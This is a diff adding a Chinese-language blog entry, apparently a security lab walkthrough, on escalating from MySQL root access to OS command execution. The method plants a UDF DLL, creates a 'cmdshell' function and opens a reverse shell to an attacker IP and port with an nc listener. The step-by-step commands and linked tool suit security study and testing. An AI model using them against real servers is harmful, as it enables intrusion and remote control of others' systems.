@@ -127,6 +127,80 @@
       </categories>
   </entry>
   <entry>
+    <title>MySQL反弹shell提权</title>
+    <url>/2021/12/10/MySQL%E5%8F%8D%E5%BC%B9shell%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>在渗透或者安全评估时，有可能遇到一些比较奇葩的环境，即使通过Mysql root账号和密码获取了webshell，由于无法执行命令。在一般的情况下，也就放弃了。但其实可以换一种思路，通过mysql查询来直接提权，可以针对以下场景：</p>
+<p>(1)通过网站无法获取webshell</p>
+<p>(2)Webshell无法执行命令</p>
+<p>(3)有phpmyadmin和root账号，无法查询或者无法获取网站的真实路径</p>
+<ul>
+<li>参考：<a href="https://netsecurity.51cto.com/art/201702/532984.htm">https://netsecurity.51cto.com/art/201702/532984.htm</a></li>
+</ul>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>MySQL</p>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li><strong>win 7</strong></li>
+<li><strong>phpstudy2016</strong></li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210163300012.png" alt="image-20211210163300012"></p>
+<ul>
+<li><strong>关闭安全文件特权；</strong></li>
+</ul>
+<p>Mysql数据库从文件导入或导出到文件，提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>
+
+<p>原因及解决方法如下：</p>
+<p>查看配置，执行mysql命令;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>如果value值为null，则为禁止，如果有文件夹目录，则只允许改目录下文件（测试子目录也不行），如果为空，则不限制目录；</p>
+<p>修改mysql配置文件<code>my.ini</code>;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 手动添加一行;</span><br><span class="line">secure_file_priv =</span><br><span class="line"></span><br><span class="line"># 表示限制只允许/home文件夹</span><br><span class="line"># secure_file_priv = /home </span><br><span class="line"></span><br><span class="line"># 表示不限制目录，等号一定要有，否则mysql无法启动</span><br><span class="line"># secure_file_priv = </span><br></pre></td></tr></table></figure>
+
+<p>修改完配置文件后，重启mysql即可生效；</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>下载<a href="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/langouster_udf.zip">langouster_udf.zip</a></p>
+<p>将langouster_udf.php上传至靶机C:\phpStudy\WWW目录下；</p>
+<p>浏览器访问：http://靶机IP/langouster_udf.php</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210163734555.png" alt="image-20211210163734555"></p>
+<p>填入对应的默认账户和密码；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">host:靶机IP</span><br><span class="line">mysql账号:root</span><br><span class="line">密码:root</span><br><span class="line">数据库名:mysql</span><br></pre></td></tr></table></figure>
+
+<p>进入后将会是如下页面；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210175946238.png" alt="image-20211210175946238"></p>
+<p>在导出目录中输入执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll</span><br></pre></td></tr></table></figure>
+
+<p>在SQL命令中执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION cmdshell RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>操作如下图所示：</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028134405581.png" alt="image-20211028134405581"></p>
+<p><strong>命令执行;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select cmdshell(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>反弹shell;</strong></p>
+<p>攻击机中执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器表单中执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br><span class="line">select backshell(&#x27;攻击机IP&#x27;,2333);</span><br></pre></td></tr></table></figure>
+
+<p>攻击机中将会返回shell;</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211211101053402.png" alt="image-20211211101053402"></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>IIS6.0缓冲区溢出漏洞(CVE-2017-7269)</title>
     <url>/2021/12/08/IIS6.0%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CVE-2017-7269)%20/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
